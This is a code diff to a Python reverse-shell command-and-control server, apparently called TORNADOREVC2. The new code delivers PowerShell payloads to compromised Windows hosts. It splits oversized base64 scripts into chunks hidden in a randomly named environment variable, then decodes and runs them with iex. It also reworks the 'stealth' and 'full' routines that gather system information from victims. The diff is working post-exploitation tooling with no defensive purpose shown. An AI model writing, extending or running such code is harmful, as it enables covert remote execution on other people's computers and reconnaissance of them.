@@ -4,6 +4,7 @@ import datetime
 import hashlib
 import os
 import re
+import secrets
 import select
 import socket
 import ssl
@@ -356,9 +357,41 @@ class TORNADOREVC2:
             return path.replace("'", "''")
         return path.replace("'", "'\\''")
 
+    _WIN_PS_CMD_LIMIT = 8190
+
     def _win_ps_cmd(self, script):
         encoded = base64.b64encode(script.encode('utf-16-le')).decode('ascii')
-        return f"powershell -NoProfile -EncodedCommand {encoded}"
+        cmd = f"powershell -NoProfile -EncodedCommand {encoded}"
+        if len(cmd) <= self._WIN_PS_CMD_LIMIT:
+            return cmd
+        return None
+
+    def _send_win_ps(self, client_sock, script, stage_timeout=3.0):
+        """Deliver a PowerShell script, chunking when EncodedCommand exceeds cmd-line limits."""
+        cmd = self._win_ps_cmd(script)
+        if cmd:
+            return self.send_to_revshell(client_sock, cmd)
+
+        encoded = base64.b64encode(script.encode('utf-16-le')).decode('ascii')
+        var = f"T{secrets.token_hex(4)}"
+        chunk_size = 2000
+        chunks = [encoded[i:i + chunk_size] for i in range(0, len(encoded), chunk_size)]
+        for idx, chunk in enumerate(chunks):
+            esc = chunk.replace("'", "''")
+            stage_ps = f"$env:{var}='{esc}'" if idx == 0 else f"$env:{var}+='{esc}'"
+            stage_cmd = self._win_ps_cmd(stage_ps)
+            if not stage_cmd or not self.send_to_revshell(client_sock, stage_cmd):
+                return False
+            self.recv_output(client_sock, timeout=stage_timeout)
+
+        run_ps = (
+            f"$s=[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($env:{var}));"
+            f"Remove-Item Env:{var} -EA 0;iex $s"
+        )
+        run_cmd = self._win_ps_cmd(run_ps)
+        if not run_cmd or not self.send_to_revshell(client_sock, run_cmd):
+            return False
+        return True
 
     def _win_ps_inline(self, script):
         escaped = script.replace('"', '`"')
@@ -414,10 +447,9 @@ class TORNADOREVC2:
         end_mark = end_mark or XFER_MARK_END
         self._flush_shell(client_sock)
         if shell_type == 'windows':
-            cmd = self._win_ps_cmd(win_ps_script)
-        else:
-            cmd = unix_cmd
-        if not self.send_to_revshell(client_sock, cmd):
+            if not self._send_win_ps(client_sock, win_ps_script):
+                return None
+        elif not self.send_to_revshell(client_sock, unix_cmd):
             return None
         output = self.recv_output(client_sock, timeout=timeout, until_marker=end_mark)
         return self._extract_marked(output, start_mark, end_mark, strip_ws)
@@ -591,34 +623,36 @@ class TORNADOREVC2:
         return self.transfer.verify_file(client_sock, remote_path)
 
     def collect_sysinfo(self, client_sock, shell_type='unknown', mode='stealth'):
+        timeout = 25.0 if mode == 'full' else 12.0
         self._flush_shell(client_sock)
         unix_cmd, win_ps = build_collect_commands(shell_type, mode=mode)
-        if shell_type == 'windows' and win_ps:
-            cmd = self._win_ps_cmd(win_ps)
-        elif unix_cmd:
-            cmd = unix_cmd
-        else:
-            for st in ('unix', 'windows'):
-                u, w = build_collect_commands(st, mode=mode)
-                if st == 'windows' and w:
-                    cmd = self._win_ps_cmd(w)
-                else:
-                    cmd = u
-                if not self.send_to_revshell(client_sock, cmd):
+
+        def _collect(st, u, w):
+            if st == 'windows' and w:
+                if not self._send_win_ps(client_sock, w):
                     return None
-                output = self.recv_output(client_sock, timeout=12.0, until_marker=SYSINFO_MARK_END)
-                info = extract_sysinfo(output)
-                if info:
-                    with self.client_lock:
-                        cinfo = self.revshell_clients.get(client_sock)
-                        if cinfo and cinfo.get('type') == 'unknown':
-                            cinfo['type'] = st
-                    return info
-            return None
-        if not self.send_to_revshell(client_sock, cmd):
-            return None
-        output = self.recv_output(client_sock, timeout=12.0, until_marker=SYSINFO_MARK_END)
-        return extract_sysinfo(output)
+            elif u:
+                if not self.send_to_revshell(client_sock, u):
+                    return None
+            else:
+                return None
+            output = self.recv_output(client_sock, timeout=timeout, until_marker=SYSINFO_MARK_END)
+            return extract_sysinfo(output)
+
+        if shell_type == 'windows' and win_ps:
+            return _collect('windows', None, win_ps)
+        if shell_type == 'unix' and unix_cmd:
+            return _collect('unix', unix_cmd, None)
+        for st in ('unix', 'windows'):
+            u, w = build_collect_commands(st, mode=mode)
+            info = _collect(st, u, w)
+            if info:
+                with self.client_lock:
+                    cinfo = self.revshell_clients.get(client_sock)
+                    if cinfo and cinfo.get('type') == 'unknown':
+                        cinfo['type'] = st
+                return info
+        return None
 
     def _parse_sysinfo_args(self, cmd_parts, from_client=False):
         mode = 'stealth'
@@ -643,11 +677,20 @@ class TORNADOREVC2:
         if not info:
             print(f"{self.colors['red']}Client disconnected{self.colors['end']}")
             return
-        if refresh or not info.get('sysinfo') or info.get('sysinfo', {}).get('collection_mode') != mode:
+        c = self.colors
+        need_collect = (
+            refresh
+            or not info.get('sysinfo')
+            or info.get('sysinfo', {}).get('collection_mode') != mode
+        )
+        if need_collect:
             shell_type = info.get('type', 'unknown')
             collected = self.collect_sysinfo(client_sock, shell_type, mode=mode)
+            if collected and collected.get('error'):
+                print(f"{c['red']}Sysinfo collection error: {collected['error']}{c['end']}")
+                collected = None
             if collected:
-                collected.setdefault('collection_mode', mode)
+                collected['collection_mode'] = mode
                 info['sysinfo'] = collected
                 logger = info.get('logger')
                 if logger:
@@ -658,6 +701,15 @@ class TORNADOREVC2:
                     self.registry.migrate_fingerprint(old_fp, fp, info)
                 info['fingerprint'] = fp
                 self.registry.register_active(info, fp)
+            elif refresh or not info.get('sysinfo'):
+                print(f"{c['red']}Failed to collect system information ({mode} mode){c['end']}")
+                return
+            else:
+                cached_mode = info.get('sysinfo', {}).get('collection_mode', 'unknown')
+                print(
+                    f"{c['yellow']}Could not refresh {mode} sysinfo; "
+                    f"showing cached {cached_mode} data{c['end']}"
+                )
         print(format_sysinfo(info.get('sysinfo'), self.colors))
 
     def print_status(self):
